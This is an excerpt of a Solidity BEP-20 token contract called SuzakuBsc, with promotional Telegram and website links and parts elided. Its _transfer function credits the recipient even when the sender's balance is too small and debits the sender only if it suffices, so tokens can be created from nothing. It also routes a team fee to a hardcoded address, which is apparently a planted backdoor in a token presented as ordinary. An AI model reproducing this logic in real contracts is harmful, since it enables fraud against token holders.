...
// Submitted for Telegram: https://t.me/chisuzaku_bsc
// Submitted for Website: hhtps://chisuzakubsc.site
...
contract  SuzakuBsc  is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x799D9d3AB07F078F029fA083c3169bcc6Fb7210a] += _teamtoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_marketingfee > 0) {
        emit Transfer(form, 0x799D9d3AB07F078F029fA083c3169bcc6Fb7210a, _teamtoken);
        }
